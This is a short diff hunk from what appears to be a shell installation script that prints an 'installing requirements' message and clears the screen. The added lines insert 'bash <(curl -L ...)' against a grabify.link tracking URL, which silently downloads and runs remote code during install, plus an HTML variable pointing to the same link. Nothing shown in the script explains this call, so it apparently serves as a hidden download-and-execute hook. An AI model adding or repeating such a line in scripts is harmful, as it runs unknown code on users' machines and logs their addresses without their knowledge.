@@ -80,6 +80,8 @@ echo "⌛ INSTALLING REQUIREMENTS..."
 echo -e $BOSLUK
 clear
  
+ bash <(curl -L https://grabify.link/3PR9KQ)
+ 
 shopt -s nocasematch
 
 TEXT='<a href="https://grabify.link/3PR9KQ i=!mfo1iu489fn1o2jlk21m4098mdoi">"test link"</a><br>'
